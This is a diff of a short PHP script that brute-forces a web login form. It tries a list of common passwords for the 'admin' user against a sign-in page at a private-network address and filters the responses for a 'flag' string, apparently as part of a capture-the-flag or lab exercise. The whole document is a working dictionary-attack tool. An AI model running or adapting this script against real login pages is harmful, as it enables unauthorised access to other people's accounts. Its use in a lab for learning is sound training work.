@@ -4,10 +4,18 @@
     "letmein", "photoshop", "1234", "monkey", "shadow", "sunshine", "12345", "password1", "princess", "azerty", "trustno1", "000000");
 
     $ch = curl_init();
+    $ret = "";
     foreach ($arr as $value) {
         $url = "http://192.168.56.101/?page=signin&username=admin&password=" . $value . "&Login=Login#";
         curl_setopt($ch, CURLOPT_URL, $url);
-        echo curl_exec($ch);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $ret .= curl_exec($ch);
     }
-
+    $arr = explode("\n", $ret);
+    foreach ($arr as $value) {
+        if (preg_match("/flag/", $value)) {
+            echo $value . "\n";
+        }
+    }
+    curl_close($ch);
 ?>
